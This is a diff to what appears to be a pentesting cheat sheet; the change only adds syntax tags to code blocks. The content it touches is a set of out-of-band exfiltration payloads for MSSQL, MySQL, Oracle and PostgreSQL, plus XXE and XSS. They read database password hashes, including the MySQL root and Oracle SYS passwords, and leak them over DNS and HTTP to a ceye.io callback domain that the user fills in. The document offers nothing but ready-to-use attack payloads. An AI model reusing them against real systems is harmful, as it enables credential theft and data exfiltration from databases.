@@ -1,5 +1,5 @@
 # mssql
-```
+```sql
 DECLARE @host varchar(1024);
 SELECT @host=(SELECT TOP 1
 master.dbo.fn_varbintohexstr(password_hash)
@@ -10,12 +10,12 @@ EXEC('master..xp_dirtree
 ```
 
 # mysql
-```
+```sql
 SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM mysql.user WHERE user='root' LIMIT 1),'.mysql.ip.port.<你的>.ceye.io\\abc'));
 ```
 
 # Oracle
-```
+```sql
 SELECT UTL_INADDR.GET_HOST_ADDRESS('ip.port.<你的>.ceye.io');
 SELECT UTL_HTTP.REQUEST('http://ip.port.<你的>.ceye.io/oracle') FROM DUAL;
 SELECT HTTPURITYPE('http://ip.port.<你的>.ceye.io/oracle').GETCLOB() FROM DUAL;
@@ -24,7 +24,7 @@ SELECT DBMS_LDAP.INIT((SELECT password FROM SYS.USER$ WHERE name='SYS')||'.ip.po
 ```
 
 # PostgreSQL
-```
+```sql
 DROP TABLE IF EXISTS table_output;
 CREATE TABLE table_output(content text);
 CREATE OR REPLACE FUNCTION temp_function()
@@ -43,7 +43,7 @@ SELECT temp_function();
 ```
 
 # XXE
-```
+```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE root [
 <!ENTITY % remote SYSTEM "http://ip.port.<你的>.ceye.io/xxe_test">
@@ -52,6 +52,6 @@ SELECT temp_function();
 ```
 
 # XSS
-```
+```html
 <img src=x onerror=http://<你的>.ceye.io>
 ```
